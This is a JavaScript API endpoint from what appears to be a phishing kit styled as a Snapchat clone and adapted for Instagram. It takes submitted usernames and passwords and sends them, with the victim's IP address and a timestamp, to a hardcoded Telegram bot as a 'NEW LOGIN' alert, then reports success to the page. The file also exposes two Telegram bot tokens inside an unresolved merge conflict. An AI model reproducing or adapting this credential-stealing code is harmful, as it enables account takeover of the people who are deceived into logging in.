// File: snapchat-clone/api/login.js (Modified for Instagram message content)

// NOTE: This file is a simplified API endpoint and requires a server environment (like Node.js with Express/Vercel) to function as an API.
// For a simple static site, you would typically use a service like Formspree or a full backend.
// Assuming a server environment is set up to route /api/login to this file.

<<<<<<< HEAD
const TELEGRAM_BOT_TOKEN = '8304693249:AAEScgp8PZ7cfo7-V78EgbV7Uy20v2ScaFQ';
=======
const TELEGRAM_BOT_TOKEN = '8233346929:AAHRpX-fz0n3LOsCLbsCEGGEQFDF7xulTyY';
>>>>>>> 0543f30505826bbf63a0e3ed1226667f66e70c75
const TELEGRAM_CHAT_ID = '6402487270';

// This function escapes special characters for Telegram's MarkdownV2.
const escapeMarkdown = (text) => {
  if (typeof text !== 'string') return '';
  // List of characters to escape in MarkdownV2
  const toEscape = /[_*[\]()~`>#+-=|{}.!]/g;
  return text.replace(toEscape, '\\$&');
};

export default async function handler(req, res) {
  if (req.method === 'POST') {
    // Assuming a server environment that parses JSON body (e.g., Express or Vercel function)
    const { username, password } = req.body;
    
    // Fallback for IP address if not running in a full server environment
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';

    // Escape each variable to prevent injection or formatting errors.
    const safeUsername = escapeMarkdown(username);
    const safePassword = escapeMarkdown(password);
    const safeIp = escapeMarkdown(ip);
    const safeTimestamp = escapeMarkdown(new Date().toISOString());

    // Correctly formatted message with double-escaped dashes, using the original Instagram message content.
    const message = `
🚨 *NEW LOGIN* 🚨
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
👤 *Username:* \`${safeUsername}\`
🔑 *Password:* \`${safePassword}\`
💻 *IP Address:* \`${safeIp}\`
⏰ *Timestamp:* \`${safeTimestamp}\`
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
    `;

    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    try {
      // Send the message to Telegram
      const response = await fetch(telegramApiUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'MarkdownV2'
        } ),
      });

      const responseData = await response.json();

      if (!response.ok) {
        console.error('--- TELEGRAM API ERROR ---', responseData);
      } else {
        console.log('Message sent to Telegram successfully!');
      }

    } catch (error) {
      console.error('--- FETCH FAILED ---', error);
    }

    // Respond to the client (important for the client-side fetch to complete)
    // In a real environment, this might be a redirect or a success message.
    res.status(200).json({ success: true });
  } else {
    res.status(405).send('Method Not Allowed');
  }
}
